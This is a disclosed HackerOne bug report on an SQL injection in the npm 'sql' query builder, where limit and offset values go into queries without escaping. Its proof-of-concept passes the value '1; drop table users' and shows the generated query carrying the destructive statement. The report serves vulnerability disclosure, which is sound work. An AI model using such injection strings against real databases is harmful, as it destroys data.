# `sql` does not properly escape parameters when building SQL queries, resulting in potential SQLi

## Report Details
- **Report ID**: 319465
- **URL**: https://hackerone.com/reports/319465
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-25T04:52:58.183Z
- **Disclosed**: 2018-05-12T09:03:10.844Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report an SQLi in `sql`.

It allows to insert potentially user-controlled content into the queries without proper escaping, in cases where that is not verified additionally in the applications that are using `sql` library.

# Module

**module name:** sql
**version:** 0.78.0
**npm page:** `https://www.npmjs.com/package/sql`

## Module Description

> sql string builder for node - supports PostgreSQL, mysql, Microsoft SQL Server, Oracle and sqlite dialects.

## Module Stats

Stats
345 downloads in the last day
6 659 downloads in the last week
24 915 downloads in the last month

~298980 estimated downloads per year

# Vulnerability

## Vulnerability Description

`sql` module constructs SQL queries from structured input, and the problem is that it doesn't do proper escaping of limit/offset parameters, so in setups where those are user-controlled (e.g. received over network) without additional validation that can cause an SQL injection vulnerability.

## Steps To Reproduce:

```js
var sql = require('sql');
var user = sql.define({
  name: 'users',
  columns: ['id', 'name', 'email', 'lastLogin']
});
console.log(user.select(user.star()).from(user).limit('1; drop table users').toQuery().text);
console.log(user.select(user.star()).from(user).offset('1; drop table users').toQuery().text);
```

Output:
```
SELECT "users".* FROM "users" LIMIT 1; drop table users
SELECT "users".* FROM "users" OFFSET 1; drop table users
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N 
- I opened an issue in the related repository: N

## Impact

SQL injection.
See https://www.owasp.org/index.php/SQL_Injection

The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Verified**
Yes

**What exploitation technique did you utilize?**
Classic / In-Band

**Please describe the results of your verification attempt.**
Observed constructed SQL queries.



## Attachments
No attachments
